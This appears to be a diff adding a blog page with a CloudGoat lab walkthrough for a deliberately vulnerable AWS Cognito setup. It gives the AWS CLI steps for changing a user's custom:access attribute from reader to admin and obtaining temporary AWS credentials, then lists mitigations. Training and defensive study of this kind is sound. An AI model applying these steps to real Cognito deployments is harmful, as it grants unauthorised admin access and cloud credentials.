@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CloudGoat Vulnerable Cognito - Complete AWS Security Lab WalkthroughAmazon Cognito is a powerful identity management service, but misconfigurations can lead to serious security vulnerabilities. This c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cloudgoat-Vulnerable_Cognito">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="CloudGoat Vulnerable Cognito - Complete AWS Security Lab WalkthroughAmazon Cognito is a powerful identity management service, but misconfigurations can lead to serious security vulnerabilities. This c">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/login.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/pool.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/ver_code.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/after_sign.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/jtw_token.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/jwt_dec.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cognito_Priv/proxy_login.png">
+<meta property="article:published_time" content="2025-05-29T22:45:51.000Z">
+<meta property="article:modified_time" content="2025-05-29T19:47:40.461Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Cognito_Priv/login.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>Cloudgoat-Vulnerable_Cognito</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/27/Cloudgoat-SQS-Flag-Shop/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&text=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&is_video=false&description=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cloudgoat-Vulnerable_Cognito&body=Check out this article: https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&title=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&name=Cloudgoat-Vulnerable_Cognito&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/05/30/Cloudgoat-Vulnerable-Cognito/&t=Cloudgoat-Vulnerable_Cognito"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-Vulnerable-Cognito-Complete-AWS-Security-Lab-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat Vulnerable Cognito - Complete AWS Security Lab Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Environment Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracted-Cognito-Configuration"><span class="toc-number">1.2.1.</span> <span class="toc-text">Extracted Cognito Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-Email-Verification"><span class="toc-number">1.3.</span> <span class="toc-text">Bypassing Email Verification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovering-Privilege-Escalation-Opportunities"><span class="toc-number">1.4.</span> <span class="toc-text">Discovering Privilege Escalation Opportunities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-Token-Analysis-and-AWS-Credentials"><span class="toc-number">1.5.</span> <span class="toc-text">JWT Token Analysis and AWS Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Attribute-Manipulation"><span class="toc-number">1.6.</span> <span class="toc-text">User Attribute Manipulation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-AWS-Credentials-via-Identity-Pool"><span class="toc-number">1.7.</span> <span class="toc-text">Obtaining AWS Credentials via Identity Pool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Implications-and-Mitigation"><span class="toc-number">1.8.</span> <span class="toc-text">Security Implications and Mitigation</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Cloudgoat-Vulnerable_Cognito
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-29T22:45:51.000Z" class="dt-published" itemprop="datePublished">2025-05-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CloudGoat-Vulnerable-Cognito-Complete-AWS-Security-Lab-Walkthrough"><a href="#CloudGoat-Vulnerable-Cognito-Complete-AWS-Security-Lab-Walkthrough" class="headerlink" title="CloudGoat Vulnerable Cognito - Complete AWS Security Lab Walkthrough"></a>CloudGoat Vulnerable Cognito - Complete AWS Security Lab Walkthrough</h1><p>Amazon Cognito is a powerful identity management service, but misconfigurations can lead to serious security vulnerabilities. This comprehensive walkthrough demonstrates how to exploit a vulnerable AWS Cognito implementation using CloudGoat, Rhino Security Labs’ intentionally vulnerable AWS infrastructure tool. Through this hands-on CloudGoat AWS security lab, we’ll explore authentication bypass techniques, JWT token manipulation, and privilege escalation in Amazon Cognito environments.</p>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>Before diving into the exploitation phase, we need to properly configure our CloudGoat environment. CloudGoat requires IP whitelisting to ensure secure access to the vulnerable infrastructure.</p>
+<p>First, configure CloudGoat to whitelist your current IP address automatically:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure>
+
+<p>Next, deploy the vulnerable Cognito scenario:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create vulnerable_cognito</span><br></pre></td></tr></table></figure>
+
+<p>Upon successful deployment, CloudGoat provides essential connection details:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apigateway_url = https://[REDACTED].execute-api.us-east-1.amazonaws.com/</span><br><span class="line">cloudgoat_output_aws_account_id = [REDACTED]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>The deployed application presents a standard login interface requiring user registration and email verification. This is where most legitimate users would stop, but security researchers know that the real vulnerabilities often lie beneath the surface.</p>
+<p><img src="/images/Cognito_Priv/login.png" alt="Login Interface"></p>
+<p>While the application requires email confirmation for account activation, examining the source code reveals critical configuration details that will prove invaluable for our exploitation attempt.</p>
+<p><img src="/images/Cognito_Priv/pool.png" alt="Cognito Pool Configuration"></p>
+<h3 id="Extracted-Cognito-Configuration"><a href="#Extracted-Cognito-Configuration" class="headerlink" title="Extracted Cognito Configuration"></a>Extracted Cognito Configuration</h3><p>Through source code analysis, we can identify the following critical Cognito parameters:</p>
+<ul>
+<li><strong>User Pool ID</strong>: <code>us-east-1_[REDACTED]</code></li>
+<li><strong>App Client ID</strong>: <code>[REDACTED]</code></li>
+<li><strong>Auth Flow</strong>: <code>USER_PASSWORD_AUTH</code> (available but commented in source)</li>
+</ul>
+<p>This information forms the foundation for our CLI-based exploitation approach.</p>
+<h2 id="Bypassing-Email-Verification"><a href="#Bypassing-Email-Verification" class="headerlink" title="Bypassing Email Verification"></a>Bypassing Email Verification</h2><p>Rather than relying on email verification, we can leverage the AWS CLI to create and confirm user accounts directly. This approach bypasses potential email delivery issues and provides more control over the registration process.</p>
+<p>Create a new user account using the AWS Cognito Identity Provider CLI:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp sign-up \</span><br><span class="line">  --client-id [CLIENT_ID] \</span><br><span class="line">  --username your-email@example.com \</span><br><span class="line">  --password <span class="string">&#x27;SecurePassword123!&#x27;</span> \</span><br><span class="line">  --user-attributes \</span><br><span class="line">    Name=<span class="string">&quot;email&quot;</span>,Value=<span class="string">&quot;your-email@example.com&quot;</span> \</span><br><span class="line">    Name=<span class="string">&quot;given_name&quot;</span>,Value=<span class="string">&quot;TestUser&quot;</span> \</span><br><span class="line">    Name=<span class="string">&quot;family_name&quot;</span>,Value=<span class="string">&quot;Security&quot;</span> \</span><br><span class="line">  --region us-east-1</span><br></pre></td></tr></table></figure>
+
+<p>Note that the <code>family_name</code> attribute is mandatory for this particular Cognito configuration. The response confirms successful user creation:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserConfirmed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;CodeDeliveryDetails&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;y***@e***&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DeliveryMedium&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EMAIL&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AttributeName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;email&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;UserSub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[USER_ID]&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>After receiving the verification code via email, confirm the account registration:</p>
+<p><img src="/images/Cognito_Priv/ver_code.png" alt="Email Verification Code"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp confirm-sign-up \</span><br><span class="line">  --client-id [CLIENT_ID] \</span><br><span class="line">  --username your-email@example.com \</span><br><span class="line">  --confirmation-code [VERIFICATION_CODE] \</span><br><span class="line">  --region us-east-1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Discovering-Privilege-Escalation-Opportunities"><a href="#Discovering-Privilege-Escalation-Opportunities" class="headerlink" title="Discovering Privilege Escalation Opportunities"></a>Discovering Privilege Escalation Opportunities</h2><p>With a confirmed account, we can now access the application. However, initial access reveals limited functionality - we’re restricted to a basic reader interface. Examining the application’s JavaScript code reveals the authorization logic:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(access)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(access == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./admin.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./reader.html&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This code snippet indicates that user privileges are determined by an <code>access</code> attribute, suggesting potential for privilege escalation if we can modify this value.</p>
+<p><img src="/images/Cognito_Priv/after_sign.png" alt="Post-Authentication Interface"></p>
+<h2 id="JWT-Token-Analysis-and-AWS-Credentials"><a href="#JWT-Token-Analysis-and-AWS-Credentials" class="headerlink" title="JWT Token Analysis and AWS Credentials"></a>JWT Token Analysis and AWS Credentials</h2><p>To understand the application’s authentication mechanism, we need to examine the JWT tokens issued by Cognito. Generate an access token using the AWS CLI:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp initiate-auth \</span><br><span class="line">  --client-id [CLIENT_ID] \</span><br><span class="line">  --auth-flow USER_PASSWORD_AUTH \</span><br><span class="line">  --auth-parameters USERNAME=your-email@example.com,PASSWORD=<span class="string">&#x27;SecurePassword123!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cognito_Priv/jtw_token.png" alt="JWT Token Response"></p>
+<p>Decoding the access token using tools like <a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a> reveals crucial information about the token structure and issuer. The <code>iss</code> (issuer) field contains the User Pool ID, which we’ll need for subsequent exploitation steps.</p>
+<p><img src="/images/Cognito_Priv/jwt_dec.png" alt="JWT Token Decoded"></p>
+<p>Amazon Cognito’s JWT implementation provides several advantages including simplified authentication workflows, enhanced scalability, and seamless integration with other AWS services. However, these tokens also contain user attribute information that may be modifiable.</p>
+<h2 id="User-Attribute-Manipulation"><a href="#User-Attribute-Manipulation" class="headerlink" title="User Attribute Manipulation"></a>User Attribute Manipulation</h2><p>Using our access token, we can query our current user attributes to understand the permission structure:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp get-user --access-token [ACCESS_TOKEN]</span><br></pre></td></tr></table></figure>
+
+<p>The response reveals our current user profile, including the critical <code>custom:access</code> attribute:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[USER_ID]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;UserAttributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;email&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;your-email@example.com&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;custom:access&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;reader&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>The <code>custom:access</code> attribute is currently set to “reader”, explaining our limited application access. If we can modify this attribute to “admin”, we should gain elevated privileges.</p>
+<p>Attempt to update the custom access attribute:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-idp update-user-attributes \</span><br><span class="line">  --access-token [ACCESS_TOKEN] \</span><br><span class="line">  --user-attributes <span class="string">&#x27;[&#123;&quot;Name&quot;:&quot;custom:access&quot;,&quot;Value&quot;:&quot;admin&quot;&#125;]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Upon successful execution, verify the change by querying user attributes again. The <code>custom:access</code> value should now show “admin”.</p>
+<h2 id="Obtaining-AWS-Credentials-via-Identity-Pool"><a href="#Obtaining-AWS-Credentials-via-Identity-Pool" class="headerlink" title="Obtaining AWS Credentials via Identity Pool"></a>Obtaining AWS Credentials via Identity Pool</h2><p>With admin privileges established, log back into the application and intercept the authentication requests using a web proxy like Burp Suite. This reveals additional infrastructure details, including the Identity Pool ID.</p>
+<p><img src="/images/Cognito_Priv/proxy_login.png" alt="Proxy Intercept Results"></p>
+<p>The Identity Pool ID (<code>us-east-1:[IDENTITY_POOL_ID]</code>) is crucial for the final credential extraction phase.</p>
+<p>Generate an Identity ID using the extracted information:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-id \</span><br><span class="line">  --region us-east-1 \</span><br><span class="line">  --identity-pool-id <span class="string">&#x27;[IDENTITY_POOL_ID]&#x27;</span> \</span><br><span class="line">  --logins <span class="string">&quot;cognito-idp.us-east-1.amazonaws.com/[USER_POOL_ID]=[ID_TOKEN]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>This command returns a unique Identity ID that can be used to obtain temporary AWS credentials:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;IdentityId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-east-1:[IDENTITY_ID]&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Finally, obtain temporary AWS credentials using the Identity ID:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws cognito-identity get-credentials-for-identity \</span><br><span class="line">  --identity-id <span class="string">&quot;[IDENTITY_ID]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Success! The response contains temporary AWS credentials with specific permissions based on the Identity Pool’s IAM role configuration:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;IdentityId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-east-1:[IDENTITY_ID]&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Credentials&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AccessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ASIA[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SecretKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SessionToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[REDACTED]&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Expiration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-05-29T23:37:16+03:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Security-Implications-and-Mitigation"><a href="#Security-Implications-and-Mitigation" class="headerlink" title="Security Implications and Mitigation"></a>Security Implications and Mitigation</h2><p>This CloudGoat AWS scenario demonstrates several critical security vulnerabilities in Amazon Cognito implementations:</p>
+<p><strong>Vulnerability Analysis:</strong></p>
+<ul>
+<li>Insufficient validation of custom user attributes</li>
+<li>Lack of server-side authorization checks</li>
+<li>Overly permissive attribute modification policies</li>
+<li>Improper Identity Pool configuration</li>
+</ul>
+<p><strong>Attack Impact:</strong><br>Attackers who successfully exploit these vulnerabilities can:</p>
+<ul>
+<li>Bypass authentication mechanisms</li>
+<li>Escalate privileges from standard user to administrator</li>
+<li>Obtain valid AWS credentials</li>
+<li>Access additional AWS resources based on Identity Pool permissions</li>
+</ul>
+<p><strong>Recommended Mitigations:</strong></p>
+<ol>
+<li><strong>Implement server-side validation</strong> for all custom attributes</li>
+<li><strong>Restrict attribute modification capabilities</strong> through IAM policies</li>
+<li><strong>Use fine-grained IAM roles</strong> for Identity Pool authentication</li>
+<li><strong>Implement proper authorization checks</strong> at the application level</li>
+<li><strong>Regular security audits</strong> of Cognito configurations</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-Vulnerable-Cognito-Complete-AWS-Security-Lab-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat Vulnerable Cognito - Complete AWS Security Lab Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Setup"><span class="toc-number">1.1.</span> <span class="toc-text">Environment Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracted-Cognito-Configuration"><span class="toc-number">1.2.1.</span> <span class="toc-text">Extracted Cognito Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-Email-Verification"><span class="toc-number">1.3.</span> <span class="toc-text">Bypassing Email Verification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovering-Privilege-Escalation-Opportunities"><span class="toc-number">1.4.</span> <span class="toc-text">Discovering Privilege Escalation Opportunities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-Token-Analysis-and-AWS-Credentials"><span class="toc-number">1.5.</span> <span class="toc-text">JWT Token Analysis and AWS Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Attribute-Manipulation"><span class="toc-number">1.6.</span> <span class="toc-text">User Attribute Manipulation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-AWS-Credentials-via-Identity-Pool"><span class="toc-number">1.7.</span> <span class="toc-text">Obtaining AWS Credentials via Identity Pool</span></a></li><li class="toc-item 